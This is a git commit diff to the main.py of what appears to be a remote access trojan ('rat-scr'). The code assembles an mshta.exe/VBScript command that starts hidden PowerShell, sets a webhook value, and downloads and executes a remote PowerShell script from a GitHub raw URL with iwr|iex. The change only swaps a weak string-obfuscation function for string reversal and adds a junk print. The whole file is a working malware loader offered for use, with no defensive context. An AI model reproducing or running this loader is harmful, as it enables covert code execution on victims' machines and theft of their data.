695cfe2790fe3c317ccdd805f7444105013bbcc1
43a1723 <hai1723notgay@gmail.com>
2024-08-19 19:13:16 +0700

    Update main.py

--- rat-scr/main.py
+++ rat-scr/main.py
@@ -1,8 +1,10 @@
 import os
 
-def obfuscate_string(s):
-    return ''.join(chr(((ord(c) + 1000) % 256)) for c in s)
+def reverse_string(s):
+    return s[::-1]
 
 pythonrat = "you_webhook"
-command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{obfuscate_string(pythonrat)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
+command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{reverse_string(pythonrat)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
 os.system(command)
+aaaasdasd = reverse_string("you_webhook") + pythonrat + "you_webhook"
+print(aaaasdasd)
